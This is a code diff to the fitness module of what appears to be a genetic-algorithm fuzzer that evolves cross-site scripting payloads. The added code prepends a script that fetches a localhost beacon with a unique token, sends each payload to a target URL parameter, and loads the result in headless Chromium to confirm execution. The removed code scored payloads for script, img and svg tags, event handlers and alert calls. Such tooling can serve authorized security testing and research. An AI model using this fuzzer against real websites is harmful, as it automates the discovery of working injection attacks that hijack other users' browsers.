@@ -1,70 +1,50 @@
-# fitness_moga.py
+# src/fitness.py
+import uuid
+import time
+from playwright.sync_api import sync_playwright
+
 from src.send_request import send_payload
-import re
-import math
-from difflib import SequenceMatcher
+from src.fitness_utils import compute_survivability, compute_structure
+from src.ga_engine import component_render
 
 def evaluate(ind, url, param):
-    payload = f"{ind[0]} {ind[1]}\"{ind[2]}\">"
-    html = send_payload(url, param, payload)
+    payload = component_render(ind)
+    token = str(uuid.uuid4())
 
-    survivability = score_survivability(payload, html)
-    structure = score_structure(payload)
+    beacon = f"http://localhost:5005/beacon?token={token}"
+    wrapper = f"<script>fetch('{beacon}')</script>"
+    final_payload = wrapper + payload
 
-    return (survivability, structure)
+    # ---- Send to target ----
+    html = send_payload(url, param, final_payload)
 
+    executed = False
+    injected_url = f"{url}?{param}={final_payload}"
 
-# -----------------------------
-# Objective 1 — survivability
-# -----------------------------
-def score_survivability(payload, html):
-    score = 0.0
+    # ---- Playwright Chromium ----
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True)
+        context = browser.new_context()
+        page = context.new_page()
 
-    # reflected?
-    if payload in html:
-        score += 15
+        def on_request(req):
+            nonlocal executed
+            if token in req.url:
+                executed = True
 
-    # char survival
-    survived = sum(1 for c in payload if c in html)
-    score += survived * 0.1
+        page.on("request", on_request)
 
-    # encoding survival
-    enc_count = len(re.findall(r"%[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}", payload))
-    score += enc_count * 0.2
+        try:
+            page.goto(injected_url, wait_until="load")
+        except Exception as e:
+            print(f"[!] Page load failed: {e}")
 
-    # transformation similarity
-    ratio = SequenceMatcher(None, payload.lower(), html.lower()).ratio()
-    score += ratio * 5
+        time.sleep(0.5)
+        browser.close()
 
-    return score
+    # ---- Fitness scores ----
+    exec_score = 1.0 if executed else 0.0
+    surv = compute_survivability(payload, html)
+    struct = compute_structure(payload)
 
-
-# -----------------------------
-# Objective 2 — structure
-# -----------------------------
-def score_structure(payload):
-    score = 0.0
-    lower = payload.lower()
-
-    # Reward meaningful structure
-    if "<script" in lower: score += 8
-    if "<img" in lower: score += 6
-    if "<svg" in lower: score += 6
-
-    # event handlers
-    events = ["onerror=", "onload=", "onmouseover=", "onclick="]
-    score += sum(5 for e in events if e in lower)
-
-    # JS atoms
-    if "alert" in lower: score += 5
-    if "console.log" in lower: score += 5
-
-    # penalties for over-encoding
-    enc_ratio = len(re.findall(r"%[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}", payload)) / max(len(payload), 1)
-    if enc_ratio > 0.5: score -= 10
-
-    # shorter payloads preferred
-    if len(payload) > 120: score -= 20
-    elif len(payload) > 80: score -= 10
-
-    return score
+    return (surv, struct, exec_score)
